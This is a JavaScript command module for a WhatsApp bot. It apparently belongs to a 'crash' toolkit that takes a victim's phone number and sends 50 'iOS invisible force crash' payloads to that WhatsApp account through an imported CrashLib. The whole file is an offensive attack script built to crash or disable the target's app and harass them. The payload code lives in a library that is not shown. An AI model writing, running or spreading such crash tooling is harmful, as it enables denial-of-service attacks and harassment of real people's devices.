'use strict';
const { CrashLib } = require('../../lib/crashlib');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'ios',
    aliases: ['ioscrash', 'iosforce'],
    category: 'crash',
    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ ᴄʀᴀsʜ',
    usage: '.ios <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}ios <number>\n📝 *Example:* ${prefix}ios 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let crashLib = global.getCrashLib?.(sock);
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        const TOTAL = 50;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                await crashLib.iosInvisibleForce(target);
                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
                await new Promise(r => setTimeout(r, 200));
            }
            
            await bar.done(`✅ ɪᴏs ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
        } catch (e) {
            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
        }
    }
};